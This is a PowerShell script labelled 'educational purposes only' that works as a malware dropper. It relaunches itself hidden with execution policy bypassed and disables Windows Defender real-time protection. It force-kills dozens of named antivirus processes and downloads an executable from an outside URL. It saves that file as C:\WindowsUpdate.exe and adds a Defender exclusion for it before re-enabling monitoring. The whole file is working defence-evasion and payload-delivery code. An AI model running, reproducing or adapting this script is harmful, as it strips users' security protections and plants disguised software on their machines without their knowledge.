# educational purposes only
$windowStyle = 'Hidden'
$psi = New-Object System.Diagnostics.ProcessStartInfo
$psi.FileName = 'powershell.exe'
$psi.Arguments = '-NoProfile -ExecutionPolicy Bypass -File "' + $PSCommandPath + '"'
$psi.WindowStyle = $windowStyle
$process = [System.Diagnostics.Process]::Start($psi)

$processList = @(
    "AvastUI.exe", "AvastSvc.exe", "AvastBCL-Svc.exe", "aswidsagent.exe", "AVGUI.exe", "AVGSvc.exe", "avguard.exe",
    "avshadow.exe", "avcenter.exe", "avscan.exe", "sched.exe", "bdservicehost.exe", "bdagent.exe", "seccenter.exe",
    "bdreinit.exe", "updatesrv.exe", "ekrn.exe", "egui.exe", "ecls.exe", "eshell.exe", "avp.exe", "kavtray.exe",
    "klnagent.exe", "kavfswp.exe", "kavfs.exe", "mcshield.exe", "mfevtps.exe", "mfemms.exe", "masvc.exe", "mcafeeap.exe",
    "ccSvcHst.exe", "nortonsecurity.exe", "nsWscSvc.exe", "symerr.exe", "PccNTMon.exe", "NTRTScan.exe", "UfSeAgnt.exe",
    "TmListen.exe", "SophosUI.exe", "SophosSafestore64.exe", "SophosFS.exe", "SophosHealth.exe", "SophosAV.exe", "mbam.exe",
    "mbamtray.exe", "MBAMService.exe", "mbamgui.exe", "PSANHost.exe", "PSUAService.exe", "PSUAMain.exe", "PandaCloudCleaner.exe",
    "cmdagent.exe", "cis.exe", "cistray.exe", "cmdvirth.exe"
)

function Disable-Defender {
    try {
        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
    } catch {
    }
}

function Stop-ProcessList {
    foreach ($processName in $processList) {
        try {
            Get-Process -Name $processName -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
        } catch {
        }
    }
}

function Download-File {
    param (
        [string]$url,
        [string]$output
    )
    Invoke-WebRequest -Uri $url -OutFile $output -ErrorAction SilentlyContinue
}

function Add-DefenderExclusion {
    param (
        [string]$path
    )
    try {
        Add-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue
    } catch {
    }
}

function Enable-Defender {
    try {
        Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue
    } catch {
    }
}

Disable-Defender

Stop-ProcessList

$downloadUrl = "https://stable.dl2.discordapp.net/distro/app/stable/win/x64/1.0.9182/DiscordSetup.exe"
$outputPath = "C:\WindowsUpdate.exe"
Download-File -url $downloadUrl -output $outputPath

Add-DefenderExclusion -path $outputPath

Enable-Defender
